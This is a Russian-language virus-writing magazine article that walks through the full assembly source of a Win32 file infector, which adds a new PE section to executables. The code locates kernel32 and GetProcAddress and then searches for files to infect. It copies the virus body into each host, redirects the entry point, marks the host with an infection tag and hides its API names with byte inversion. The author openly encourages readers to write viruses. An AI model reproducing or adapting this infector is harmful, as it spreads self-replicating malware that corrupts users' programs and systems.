
▐█ █▐▀█▄▐▀█ ▀▐▀▀▌▀█▄▐▀▀▌    ▄▄▄█▀█
 █ █▐  █▐▄█▌█▐  ▄  █▐       █▄▄▄▄    ▄    Добавление секции к PE
 █▄█▐▄▄█▐  █▐▐  █▄▄█▐       ▀   ▀█  
▐█ █▐▄ █▐▄██▐▐▄ █▄ █▐▄      ▀█▄▄█▀   ▀    (c) dZen
==============================================================================

  Писать простые вирусы - просто. Писать хорошие вирусы - еще проще... Главное
знать как это делается :)) Поэтому продолжим свое обучение. В первых номерах
журнала стараниями Nekr0! вы уже успели познакомиться с азами программирования 
пож Win32. То есть теперь вы с легкостью делаете себя спутником любого EXE файла
и без проблем дописываете себя в последнюю секцию файла. Ладно, это все, 
конечно, весело, но надо двигаться дальше. То есть теперь мы не будем искать 
подходящую по размеру секцию в файле. Теперь мы своими же руками создадим ее :)
  Это значительно не увеличит алгоритм заражения, но мы же пока только учимся. 
Поэтому не стоит сразу бросаться в самую гущу. Изучить основы - самое 
главное! :))
  На этом патетический прогон и окончим. Перейдем к самому вирусу. Я буду 
рассматривать код по отдельным маленьким частям и описывать все как можно
подробнее. Поэтому заранее вас предупрежу - не стоит вырезать эти куски из
текста. Полный исходник (правда не комментированный) лежит в архиве. Так что
изучайте на здоровье.
  Так...

.386p
.model flat, stdcall

extrn ExitProcess:PROC

  Если вы не смогли понять этот кусок, то, наверное пока что не стоит читать этот
текст. Возьмите в руки книжечку по ассемблеру, почитайте на досуге. А потом,
глядишь, и вовсе перехочется этим заниматься.
  Слышим удаляющийся топот, восторженные повизгивания от полученной информации.

.data
Starter:    
        pusha                                   
        Call    delta
delta:
        pop     ebp
        sub     ebp, offset delta

  Итак, что можно сказать сразу? НИКОГДА НЕ ПОМЕЩАЙТЕ СВОЙ КОД И СВОИ ДАННЫЕ В 
РАЗНЫЕ СЕКЦИИ ФАЙЛА!!! Так как если вы будете кого-то заражать (всмысле 
вируса...ну, компьютерного :), то придется все записывать по разным местам.
То есть не занимайтесь геммороем, а кладите весь свой код в .data секцию и 
радуйтесь.
  Во-первых, во всех тех зверьках, которые вы напишете в будущем (я надеюсь),
не забывайте сохранять все регистры перед началом работы. Например, рассмотрим
такую ситуацию: в зараженной программе первым выполнился ваш код. Куча 
аплодисментов, чувство выполненного долга... А потом вы отдаете управление
назад, на старую точку входа. А основной программе (будем называть ее хостом)
для своей работы требуется регистр eax, в котором по идее должно лежать 
тот адрес, с которой она начала свое выполнение. А вы его поменяли... И что
же произойдет, спросите вы? А попробуйте! Красивое окошечко? Это называется
GPA (General Protection Fault то бишь). А вот для таких вещей нужно использовать
SEH (Structured Exception Handling - о чем речь пойдет в следующих статьях). 
Короче, чтобы хост выполнялся без ошибок - сохраняйте базовые значения 
регистров.
  Во-вторых, дельта смещение. Что это такое? А это такая вещь, без которой 
в наше злобное время никуда. Да и в ДОСе без него далеко было не уйти. Так вот.
Все ваши данные, адреса которых вы загружаете в регистры для дальнейшего 
доступа к ним, лежат по определенным ЗАРАНЕЕ смещениям. То есть когда 
происходит линковка всей программы, этот самый линковщик (программа tlink32 в
для тех, кто не знал) заменяет все команды вида "mov eax, offset data" на 
что-то вроде "mov offset, 004020aeh". То есть если вручную дописать в середину
программы несколько комманд, то все нижележищие смещения потеряют смысл! Не
понятно? Давайте на примере. Вот обычный кусок кода:

00401000:   mov     eax, offset data
00401006:   xchg    eax, ebx
00401007:   push    ebx

data    dd 12345678h

  Это исходник. В финальном варианте это будет выгдядеть примерно так:            
        
00401000:   mov     eax, 00401008h
00401006:   xchg    eax, ebx
00401007:   push    ebx

00401008:   12345678h

  То есть в eax помещается реальное смещение в памяти. А теперь допустим мы
модифицировали  программу таким образом (без последующей ее компиляции):        
       
00401000:   mov     eax, offset data
00401006:   xchg    eax, ebx
00401007:   push    ebx
00401008:   call    ebx

00401009:   12345678h

  Что же произошло? Все смещения в файле (после команды push) сдвинулись на 1
байт. Поэтому если теперь выполнить весь этот код заново, то выполнится он не
совсем верно :)
  То же будет и с вашим вирусом. Т.к. если мы запишем себя в конец хоста, то
все смещения будут сдвинуты ровно на размер всего вышележащего кода. Не 
очень-то приятно :) Поэтому умные люди за нас и придумали как выяснить дельта 
смещение, с помощью которого мы могли бы нормально жить.
  На самом деле все было бы гораздо проще, если бы не фирма Intel с ее 
архитектурой процессора под гордым названием "Пеньтиум", который мы все в 
основном и юзаем. Как было бы легко жить, если бы можно было просто взять и 
использовать регистр eip в своих нуждах (это счетчик комманд и указывает он
всегда на ту инструкцию, которая будет выполнена в данный момент - кто не 
знал). Но увы. Этого делать нельзя. Но можно обойти :) Как? Очень просто!
Знаете такую инструкцию процессора - call? Хорошо! Вот когда вы ее используете,
то в стек помещается адрес следующей за ней комманды. Адрес возврата по-нашему.
Вот мы и получили то, что хотели... а разве могло быть иначе?  :)
  "Так, хорошо. А что же с ним делать дальше?". Все очень просто. Теперь каждый
раз, когда вы будете читать/писАть свои данные, просто приплюсовывайте к
адресу где они расположены еще и это значение.               
        
        lea     edi, [ebp+offset data]
        mov     ecx, datasize        
Decrypt:
        not     byte ptr [edi]
        inc     edi
        loop    Decrypt             

  Здесь мы расшифровываем свои данные, которые были зашифрованы нами же :) Я
это сделал просто для того, чтобы не так уж светились имена используемых нами
функций. Это простое инверсирование, ничего больше.

virus:  
        mov     eax, [ebp+offset imbase]
        add     eax, [ebp+offset ep]
        mov     [esp+1ch], eax

  Чтобы использовать сохраненную ранее точку входа (настоящую), мы записываем
ее в стек, замещая тем самым нашу. То есть когда вы сохранили все свои 
регистры, все их данные занеслись в стек. А по адресу [esp+1ch] лежит регистр
eax. Вот его-то мы и замещаем.

        mov     esi, [esp+20h]
        mov     edx, 50h
        and     esi, 0ffff0000h

Search_Kernel:
        cmp     word ptr [esi], 'ZM'
        je      Check_Kernel
        dec     edx
        cmp     edx, 0
        je      _exit
        sub     esi, 1000h
        jmp     Search_Kernel

  Это поиск кернела. Вся эта процедура была описана Nekr0! ранее, так что я
поясню просто ее смысл. В стеке лежит адрес, который нас вызвал (по идее это
сам kernel32). Поэтому мы сохраняем его и ищем его начало по сигнатуре 'ZM'.
А так как его адрес должен быть кратен странице, то и округляем мы этот адрес
по маске 0ffff0000h. Все просто :)

Check_Kernel:
        mov     edi, esi
        mov     esi, [esi+3ch]
        add     esi, edi
        cmp     word ptr [esi], 'EP'
        je      Get_Api
        xchg    esi, edi
        sub     esi, 1000h
        jmp     Search_Kernel
  
  Про это тоже уже рассказывалось. В общем, я просто буду пояснять весь код
до метки Create_Section.
  Здесь мы проверяем по найденному нами адресу заголовок РЕ файла. Если это 
так, то по идее мы нашли адрес самого кернела. Поэтому можно смело приступать к
поиску подходящей нам апи-функции.

Get_Api:
        mov     [ebp+offset Kernel_addr], edi
        add     esi, 78h
        mov     ebx, [esi]
        add     ebx, edi

  По смещению 78h от начала РЕ заголовка лежит адрес таблицы экспортов. Именно
она нам и нужна.

        mov     esi, [ebx+18h]
        mov     [ebp+offset NumberOfNames], esi
        mov     edx, esi

        mov     esi, [ebx+1ch]
        add     esi, edi
        mov     [ebp+offset ExportAddressTable], esi

        mov     esi, [ebx+20h]
        add     esi, edi
        mov     [ebp+offset ExportNameTableP], esi

        mov     esi, [ebx+24h]
        add     esi, edi
        mov     [ebp+offset ExportOrdinalTable], esi
        xor     ebx, ebx
        mov     esi, [ebp+offset ExportNameTableP]

  Этот кусок кода сохраняет необходимые нам для дальнейшей работы параметры
таблицы экспортов kernel32. Итак, по-порядку:
  NumberOfNames: число указателей на имена экспортируемых модулем функций (18h
от начала таблицы экспортов).
  ExportAddressTable: указатель на таблицу адресов (1ch от начала таблицы 
экспортов).
  ExportNameTableP: указатель на таблицу укзателей на имена (и на кой эти 
указатели на указатели на указатели? :) - 20h от начала таблицы экспортов.
  ExportOrdinalTable: указатель на таблицу ординалов (24h от начала таблицы 
экспортов).
        
Search_Api:
        mov     [ebp+Index], esi        
        mov     esi, [esi]
        add     esi, [ebp+offset Kernel_addr]
        lea     edi, [ebp+offset API]
        mov     ecx, API_size
        repe     cmpsb
        je      Get_Addr
        add     dword ptr [ebp+offset Index], 4
        mov     esi, [ebp+offset Index]
        inc     ebx
        cmp     ebx, edx
        jge      _exit
        jmp     Search_Api

  Этот кусок ищет подходящую нам по имени функцию (GetProcAddress). Когда 
имена сравниваемых функций совпадут (мы найдем подходящую нам), то в ebx
у нас будет ее номер (то есть под каким номером она лежит в массиве имен).

Get_Addr:
        xchg    eax, ebx
        mov     ebx, 2
        mul     ebx
        mov     esi, [ebp+offset ExportOrdinalTable]
        add     esi, eax

        xor     eax, eax        
        mov     ax, word ptr [esi]
        mov     ecx, 4
        mul     ecx
        mov     esi, [ebp+offset ExportAddressTable]
        add     esi, eax
        lodsd
        add     eax, dword ptr [ebp+offset Kernel_addr]
        mov     [ebp+offset GPA], eax

  А вот это завершающий момент нудной процедуры поиска :) Здесь мы с помощью
таблицы ординалов и таблицы адресов экспорта получаем долгожданный адрес
функции GetProcAddress. Дальше - веселее :)
        
        lea     ecx, offset [ebp+Search_Rec]
        push    ecx
        lea     ecx, offset [ebp+filemask]
        push    ecx
        lea     eax, [ebp+offset FindFirstFileA_]
        call    GetApiAddr

        cmp     eax, -1
        je      Find_Next

        mov     [ebp+Search_Handle], eax

  Поиск подходящего нам файла. Все очень просто. В стек помещается адрес 
структуры поиска (определенной заранее), маска поиска и вызывается, собственно,
сама функция. Вот только не стандартным путем, а через наш обработчик. Но об
этом ниже.
        
Infect:
        push    0                               ;Это всегда 0. Нафиг не нужно
        push    80h                             ;FILE_ATTRIBUTE_NORMAL - 80h
        push    3                               ;OPEN_EXISTING - 3
        push    0                               ;SECURITY_ATTRIBUTES - нафих не нада
        push    1+2                             ;FILE_SHARE_READ+FILE_SHARE_WRITE
        push    80000000h+40000000h             ;GENERIC_READ+GENERIC_WRITE
        lea     ecx, offset [ebp+file_fullname] ;И имя нашего файла
        push    ecx
        lea     eax, [ebp+offset CreateFileA_]
        call    GetApiAddr                                

        cmp     eax, -1
        je      Find_Next

        mov     ebx, eax
        mov     [ebp+offset filehandle], ebx

  Открываем найденный файл. Если кто не знает параметров, я откомментировал :)
Да, имя найденного файла мы берем все из той же структуры поиска (вот только
для этого она нам и понадобилась).

        push    0
        push    ebx
        lea     eax, [ebp+offset GetFileSize_]
        call    GetApiAddr

        and     ax, 0f000h
        add     eax, 00001000h
        mov     [ebp+offset filesize], eax
        add     eax, virsize

  Возьмем размер нашего файла в байтах, добавим к нему еще 1000h - это для 
того, чтобы выделить достаточное количество места для работы с образом в памяти
компьютера. В общем, так быстрее и меньше кода :)

        push    eax
        push    0
        lea     eax, [ebp+offset GlobalAlloc_]
        call    GetApiAddr                                

        mov     edi, eax

  Выделим эту самую память под наши нужды.

        push    0
        push    esp
        mov     eax, [ebp+offset filesize]
        push    eax
        push    edi
        push    ebx
        lea     eax, [ebp+offset ReadFile_]
        call    GetApiAddr               

  И считаем туда весь файл от начала до конца :)

        mov     esi, [edi+3ch]        
        cmp     word ptr [edi+esi], "EP"
        jne     Find_Next
        mov     [ebp+offset PE_offs], esi
        add     esi, 58h
        cmp     dword ptr [edi+esi], 'KCUF'
        je      Find_Next

  Этот кусок проверяет открытый нами файл на принадлежность к РЕ. Если это так,
то еще заодно проверим метку зараженности. Я решил, что такой меткой будет 
слово "FUCK" в поле Checksum. Оно никем никогда не используется (по крайней 
мере в 98 виндах я про такое не слышал), поэтому если мы запишем туда несколько
байт - то это никому не повредит :)

Create_Section:
        mov     esi, [ebp+offset PE_offs]
        add     esi, 28h
        mov     eax, [edi+esi]
        mov     [ebp+offset ep], eax
        add     esi, 0ch
        mov     eax, [edi+esi]
        mov     [ebp+offset imbase], eax

  Ну а теперь та чатсть, ради которой я все это и пишу. А именно - добавление
новой секции в файл. Но для начала сохраним старые параметры файла - Image Base
и Entry Point.

        mov     esi, [ebp+offset PE_offs]
        xor     eax, eax
        add     esi, 06h
        mov     ax ,word ptr [edi+esi]
        mov     [ebp+NumOfObjects], ax

  Итак, прямо за заголовком РЕ файла лежит таблица секций. Что это такое? Ну...
В общем это выглядит так: каждый файл в виндах имеет хотя бы одну секцию 
(секцию кода). Все эти секции (еще их называют объектами) расположены по
разным адресам в памяти, имеют разные флаги (в некоторые секции можно писать,
некоторые читать ... за большей информацие смотрите описание РЕ от Hard 
Wizdom`а). Все, что нам нужно сделать - это добавить нужную запись в Object 
Entry и поменять некоторую информацию в заголовке файла.
  По смещению 06h от начала заголовка находистся dword, который указывает на
число секций файла. Оно нам потребуется еще очень для многого :) А пока мы
просто сохраним его в переменной.
        
        add     esi, 0f2h                   ;ESI теперь указывает на самую первую таблицу секций
        push    esi                         ;сохраним этот адрес в стеке
        xor     ebx, ebx
        xor     ecx, ecx
        xor     edx, edx
        mov     cx, [ebp+NumOfObjects]      ;В CX загрузим общее количество секций. Это в роли счетчика
        add     esi, 0ch                    ;0ch от начала таблицы - RVA секции
        mov     ebx, [edi+esi]              ;Это значение в EBX (пока это наибольшее из возможных)

Search_RVA:
        mov     eax, [edi+esi]              ;В EAX - RVA текущей секции
        cmp     ebx, eax                    ;Сохраним текущее значение с наибольшим
        ja      Small                       ;Если оно меньше - возьмем следующее
        mov     ebx, eax                    ;Если нет, заменим значение EBX большим
        mov     edx, esi                    ;EDX указывает на номер секции, имеющей самое большое RVA
Small:  add     esi, 28h                    ;Размер Object Entry - 28h, получили тот же указатель, но в другой секции
        loop    Search_RVA                  ;Ищем CX раз

        
  Первый шаг - это определить по какому RVA нам надо загрузить свою новую
секцию, чтобы ненароком не перекрыть данные хоста. Поэтому из каждой таблицы
секций мы берем тот адрес, по которому этот объект будет загружен. В общем,
нам надо найти наибольший адрес из всех имеющихся. На самом деле по идее
наибольшим должен быть тот адрес, который лежит последним. Но фирма Micro$oft
обладает очень нехорошим чувством юмора. Поэтому для того, чтобы наш вирус не
загнулся на полпути, мы руками выясним тот RVA, по которому нам было бы удобнее
себя загрузить.

        xchg    esi, edx

        add     ebx, dword ptr [edi+esi-4]
        and     bx, 0f000h
        add     bx, 1000h
        mov     [ebp+offset SectionRVA], ebx

  В EBX у нас самый большой RVA секции, прибавив еще и ее размер получим самое
подходящее для нас смещение :) Но для начала надо его округлить.

        mov     ebx, [ebp+PE_offs]
        add     ebx, 108h
        mov     eax, 28h
        mov     cx, [ebp+NumOfObjects]
        dec     cx
        mul     cx
        add     eax, ebx
        
        mov     ebx, [edi+eax]
        add     ebx, [edi+eax+4]        
        mov     [ebp+PhysicalOffset], ebx

  По такому же типу мы выяснили и свое физическое смещение в файле. Взяли физ.
смещение самой последней секции и прибавили к нему физ. размер.

        add     esi, 1ch

        push    edi
        add     edi, esi
        lea     esi, [ebp+offset ObjectEntry]
        mov     ecx, ObjectSize
        rep     movsb 

  Когда все поля нашей структуры заполнены, мы готовы добавить ее в сам файл 
(точне пока не в сам, а в его образ в памяти).

        mov     edi, [esp]
        add     edi, [ebp+offset PhysicalOffset]
        lea     esi, [ebp+offset Starter]
        mov     ecx, virsize
        rep     movsb

  Затем по выясненному нами физическому смещению мы записываем это самую 
секцию, т.е. код нашего вируса. И ... ВУАлЯ!! :))) Мы создали новую секцию в
зараженном файле. Теперь осталось самое малое - поменять точку входа на наш
код и переписать несколько полей в заголовке файла.

        pop     edi
        mov     esi, [ebp+offset PE_offs]
        add     esi, 06h
        inc     word ptr [edi+esi]

  Сначала запишем точное количество секций. Это число находится по смещению 06h
от начала РЕ. Просто увеличим его на 1 :)

        add     esi, 16h
        mov     eax, [ebp+offset VirtualSize]
        add     eax, dword ptr [edi+esi]

  Изменим размер программного кода в файле. Приплюсуем к данному значению наш
виртуальный размер и все.

        add     esi, 0сh      
        mov     ecx, [ebp+offset SectionRVA]
        mov     [edi+esi], ecx

  Перепишем точку входа. Она находится на 28h от начала заголовка. Вместо нее 
мы записываем найденное ранее RVA нашей готовой секции. Ее не надо выравнивать 
на Image Base, т.к. этот адрес ОТНОСИТЕЛЬНЫЙ! :) Ну, да вы и сами это знаете.

        add     esi, 30h
        mov     [edi+esi], 'KCUF'

  И поставим метку зараженности. Запишем, как я уже говорил, слово "FUCK" в 
поле File Checksum, находящееся на 58h дальше начала заголовка.

        push    edi
        add     edi, [ebp+offset PhysicalOffset]
        add     edi, data_offs
        mov     ecx, datasize
Crypt:  not     byte ptr [edi]
        inc     edi
        loop    Crypt             

  И, так сказать, "зашифруем" данные :)) Просто проинверсируем все байты. Это
чтобы в любопытные глаза не сразу бросались наши функции.

Write:
        pop     edi
        
        push    0
        push    0
        push    0
        mov     eax, [ebp+offset filehandle]
        push    eax
        lea     eax, [ebp+offset SetFilePointer_]
        call    GetApiAddr

        push    0
        push    esp
        mov     eax, [ebp+offset filesize]
        add     eax, virsize
        push    eax
        push    edi
        mov     eax, [ebp+offset filehandle]
        push    eax
        lea     eax, [ebp+offset WriteFile_]
        call    GetApiAddr                     

        mov     eax, [ebp+offset filehandle]
        push    eax
        lea     eax, [ebp+offset CloseHandle_]
        call    GetApiAddr                     

  И, наконец-то, завершающее действие :)) Перепишем файл на диске тем его 
образом, который мы создали в памяти.

Find_Next:
        push    edi
        lea     eax, [ebp+offset GlobalFree_]
        call    GetApiAddr

  Освободим выделенную ранее память.
                
        lea     ecx, offset [ebp+Search_Rec]
        push    ecx
        lea     ecx, offset [ebp+Search_Handle]
        push    ecx
        lea     eax, [ebp+offset FindNextFileA_]
        call    GetApiAddr

        or      eax, eax
        jnz     Infect

  И будем искать слудеющий подходящую нам жертву :)) Теперь опять все сначала.

_exit:
        popa
        jmp     eax

  А если файлов таких больше нету, или ошибка какая была - тогда отдадим 
управление на настоящую точку входа. Пусть юзеры порадуются своим программам.
А мы еще вернемся... :)

GetApiAddr:
        push    eax
        mov     eax, [ebp+offset Kernel_addr]
        push    eax
        mov     eax, dword ptr [ebp+offset GPA]        
        call    eax
        jmp     eax

  А это наш обработчик. Сначала возьмем адрес нужной нам функции через 
GetProcAddr, а только потом вызовем ее.

data:
data_offs           equ $-Starter
NumOfObjects        dw ?
filesize            dd ?
filehandle          dd ?
imbase              dd 00400000h
ep                  dd 00001008h

ObjectEntry:                                    ;Это наш новый Object Entry
    ObjectName      db "CODE2",0,0,0            ;Имя секции. Может быть любым
    VirtualSize     dd 00001000h                ;Виртуальный размер
    SectionRVA      dd ?                        ;RVA секции + новая точка входа
    PhysicalSize    dd 00001000h                ;Физический размер
    PhysicalOffset  dd ?                        ;Физическое смещение в файле
    Reserved        db 0ch dup (0)              ;Зарезервированные 12 байт
    ObjectFlags     dd 0c0000040h               ;Флаги секции
ObjectSize          equ $-ObjectEntry
;------------------------------------------
FindFirstFileA_     db "FindFirstFileA",0
CreateFileA_        db "CreateFileA",0
SetFilePointer_     db "SetFilePointer",0
CloseHandle_        db "CloseHandle",0
ReadFile_           db "ReadFile",0
GlobalAlloc_        db "GlobalAlloc",0
WriteFile_          db "WriteFile",0
FindNextFileA_      db "FindNextFileA",0
GetFileSize_        db "GetFileSize",0
GlobalFree_         db "GlobalFree",0
filemask            db "*.EX_",0

PE_offs             dd ?

NumberOfNames       dd ?
ExportAddressTable  dd ?
ExportNameTableP    dd ?
ExportOrdinalTable  dd ?
Kernel_addr         dd ?
API                 db "GetProcAddress", 0
API_size            equ $-API
Index               dd ?
GPA                 dd ?                                     

Search_Handle       dd ?

Search_Rec:
file_attr               dd ?
file_create_time        dd ?
                        dd ?
file_last_access_time   dd ?
                        dd ?
file_last_write_time    dd ?
                        dd ?
file_size_high          dd ?
file_size_low           dd ?
file_reserved           dd ?
                        dd ?
file_fullname           db 260 dup (?)
file_dosname            db 14 dup (?)

virsize                 equ $-virus
datasize                equ $-data
virend:

.code
start:
        pusha
        xor     ebp, ebp
        jmp     virus

        push    0
        call    ExitProcess
end start
end